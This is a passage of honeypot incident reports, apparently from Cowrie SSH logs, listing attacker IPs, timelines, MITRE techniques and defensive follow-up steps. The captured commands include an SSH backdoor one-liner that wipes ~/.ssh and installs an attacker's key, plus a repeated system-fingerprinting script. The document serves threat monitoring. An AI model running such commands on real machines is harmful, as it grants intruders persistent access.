| **Last Seen** | 2026-08-01 09:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:20:25` | `cowrie.session.connect` |
| `2026-08-01 09:20:25` | `cowrie.client.version` |
| `2026-08-01 09:20:26` | `cowrie.client.kex` |
| `2026-08-01 09:20:26` | `cowrie.login.success` |
| `2026-08-01 09:20:27` | `cowrie.session.params` |
| `2026-08-01 09:20:27` | `cowrie.command.input` |
| `2026-08-01 09:20:27` | `cowrie.command.failed` |
| `2026-08-01 09:20:27` | `cowrie.log.closed` |
| `2026-08-01 09:20:27` | `cowrie.session.params` |
| `2026-08-01 09:20:27` | `cowrie.command.input` |
| `2026-08-01 09:20:28` | `cowrie.session.file_download` |
| `2026-08-01 09:20:28` | `cowrie.log.closed` |
| `2026-08-01 09:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ff1001c3bc

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-08-01 09:20 |
| **Last Seen** | 2026-08-01 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:20:28` | `cowrie.session.connect` |
| `2026-08-01 09:20:28` | `cowrie.client.version` |
| `2026-08-01 09:20:28` | `cowrie.client.kex` |
| `2026-08-01 09:20:28` | `cowrie.login.success` |
| `2026-08-01 09:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d57e02cabf4

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-08-01 09:20 |
| **Last Seen** | 2026-08-01 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:20:28` | `cowrie.session.connect` |
| `2026-08-01 09:20:28` | `cowrie.client.version` |
| `2026-08-01 09:20:28` | `cowrie.client.kex` |
| `2026-08-01 09:20:29` | `cowrie.login.success` |
| `2026-08-01 09:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497d319ebfc3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:21 |
| **Last Seen** | 2026-08-01 09:21 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:21:04` | `cowrie.session.connect` |
| `2026-08-01 09:21:07` | `cowrie.client.version` |
| `2026-08-01 09:21:07` | `cowrie.client.kex` |
| `2026-08-01 09:21:13` | `cowrie.login.success` |
| `2026-08-01 09:21:18` | `cowrie.session.params` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.success` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:18` | `cowrie.command.input` |
| `2026-08-01 09:21:20` | `cowrie.log.closed` |
| `2026-08-01 09:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40777d022767

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:22 |
| **Last Seen** | 2026-08-01 09:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:22:24` | `cowrie.session.connect` |
| `2026-08-01 09:22:26` | `cowrie.client.version` |
| `2026-08-01 09:22:26` | `cowrie.client.kex` |
| `2026-08-01 09:22:34` | `cowrie.login.success` |
| `2026-08-01 09:22:38` | `cowrie.session.params` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.success` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:38` | `cowrie.command.input` |
| `2026-08-01 09:22:40` | `cowrie.log.closed` |
| `2026-08-01 09:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e70b55559a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:23 |
| **Last Seen** | 2026-08-01 09:23 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:23:41` | `cowrie.session.connect` |
| `2026-08-01 09:23:44` | `cowrie.client.version` |
| `2026-08-01 09:23:44` | `cowrie.client.kex` |
| `2026-08-01 09:23:50` | `cowrie.login.success` |
| `2026-08-01 09:23:55` | `cowrie.session.params` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.success` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:55` | `cowrie.command.input` |
| `2026-08-01 09:23:57` | `cowrie.log.closed` |
| `2026-08-01 09:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289b159783f1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:24 |
| **Last Seen** | 2026-08-01 09:25 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:24:59` | `cowrie.session.connect` |
| `2026-08-01 09:25:01` | `cowrie.client.version` |
| `2026-08-01 09:25:01` | `cowrie.client.kex` |
| `2026-08-01 09:25:08` | `cowrie.login.success` |
| `2026-08-01 09:25:12` | `cowrie.session.params` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.success` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:12` | `cowrie.command.input` |
| `2026-08-01 09:25:14` | `cowrie.log.closed` |
| `2026-08-01 09:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3547ad9234d6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:26 |
| **Last Seen** | 2026-08-01 09:26 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:26:16` | `cowrie.session.connect` |
| `2026-08-01 09:26:18` | `cowrie.client.version` |
| `2026-08-01 09:26:18` | `cowrie.client.kex` |
| `2026-08-01 09:26:24` | `cowrie.login.success` |
| `2026-08-01 09:26:28` | `cowrie.session.params` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.success` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:28` | `cowrie.command.input` |
| `2026-08-01 09:26:30` | `cowrie.log.closed` |
| `2026-08-01 09:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f3c28f1e53

| Field | Detail |
|---|---|
| **Source IP** | `124.70.190[.]197` |
| **First Seen** | 2026-08-01 09:26 |
| **Last Seen** | 2026-08-01 09:28 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:26:58` | `cowrie.session.connect` |
| `2026-08-01 09:28:36` | `cowrie.client.version` |
| `2026-08-01 09:28:36` | `cowrie.client.kex` |
| `2026-08-01 09:28:40` | `cowrie.login.success` |
| `2026-08-01 09:28:43` | `cowrie.session.params` |
| `2026-08-01 09:28:43` | `cowrie.command.input` |
| `2026-08-01 09:28:44` | `cowrie.log.closed` |
| `2026-08-01 09:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.70.190[.]197` to AbuseIPDB if not already reported
- [ ] Block `124.70.190[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7473bbcd64ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:27 |
| **Last Seen** | 2026-08-01 09:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:27:27` | `cowrie.session.connect` |
| `2026-08-01 09:27:29` | `cowrie.client.version` |
| `2026-08-01 09:27:29` | `cowrie.client.kex` |
| `2026-08-01 09:27:35` | `cowrie.login.success` |
| `2026-08-01 09:27:40` | `cowrie.session.params` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.success` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:40` | `cowrie.command.input` |
| `2026-08-01 09:27:41` | `cowrie.log.closed` |
| `2026-08-01 09:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb70c314756a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:28 |
| **Last Seen** | 2026-08-01 09:28 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:28:41` | `cowrie.session.connect` |
| `2026-08-01 09:28:43` | `cowrie.client.version` |
| `2026-08-01 09:28:43` | `cowrie.client.kex` |
| `2026-08-01 09:28:49` | `cowrie.login.success` |
| `2026-08-01 09:28:53` | `cowrie.session.params` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.success` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:53` | `cowrie.command.input` |
| `2026-08-01 09:28:54` | `cowrie.log.closed` |
| `2026-08-01 09:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc76d1f55c7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:29 |
| **Last Seen** | 2026-08-01 09:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:29:53` | `cowrie.session.connect` |
| `2026-08-01 09:29:54` | `cowrie.client.version` |
| `2026-08-01 09:29:54` | `cowrie.client.kex` |
| `2026-08-01 09:29:59` | `cowrie.login.success` |
| `2026-08-01 09:30:02` | `cowrie.session.params` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.success` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:02` | `cowrie.command.input` |
| `2026-08-01 09:30:03` | `cowrie.log.closed` |
| `2026-08-01 09:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b50ed98412d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:31 |
| **Last Seen** | 2026-08-01 09:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:31:01` | `cowrie.session.connect` |
| `2026-08-01 09:31:02` | `cowrie.client.version` |
| `2026-08-01 09:31:02` | `cowrie.client.kex` |
| `2026-08-01 09:31:08` | `cowrie.login.success` |
| `2026-08-01 09:31:11` | `cowrie.session.params` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.success` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:11` | `cowrie.command.input` |
| `2026-08-01 09:31:13` | `cowrie.log.closed` |
| `2026-08-01 09:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb70d869e17

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:32 |
| **Last Seen** | 2026-08-01 09:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:32:14` | `cowrie.session.connect` |
| `2026-08-01 09:32:15` | `cowrie.client.version` |
| `2026-08-01 09:32:15` | `cowrie.client.kex` |
| `2026-08-01 09:32:20` | `cowrie.login.success` |
| `2026-08-01 09:32:23` | `cowrie.session.params` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.success` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:23` | `cowrie.command.input` |
| `2026-08-01 09:32:24` | `cowrie.log.closed` |
| `2026-08-01 09:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
